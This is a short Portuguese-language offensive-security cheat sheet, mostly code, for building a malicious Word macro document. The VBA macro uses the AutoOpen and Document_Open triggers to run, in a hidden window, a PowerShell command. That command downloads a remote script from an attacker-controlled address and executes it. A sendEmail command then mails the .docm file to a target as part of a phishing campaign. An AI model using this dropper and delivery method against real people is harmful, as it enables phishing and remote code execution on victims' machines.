---
title: "Word Macro"
---

# Word Macro

Macro VBA com gatilhos `AutoOpen` e `Document_Open` para execução de payload PowerShell ao abrir um documento `.docm`. Inclui envio por e-mail via `sendEmail` para entrega em campanhas de phishing.

```vb
Sub AutoOpen()
    cehb
End Sub

Sub Document_Open()
    cehb
End Sub

Sub cehb()
    Dim zoltan As String
    zoltan = "powershell (New-Object System.Net.WebClient).DownloadString('http://192.168.49.117/cehb.ps1')|IEX"
    Shell zoltan, vbHide
End Sub
```

```shell
# Enviar o documento por e-mail
sendEmail -t target@domain.com -f user@domain.com -u "File" -m "Get the file" -s 192.168.100.2 -a file.docm
```
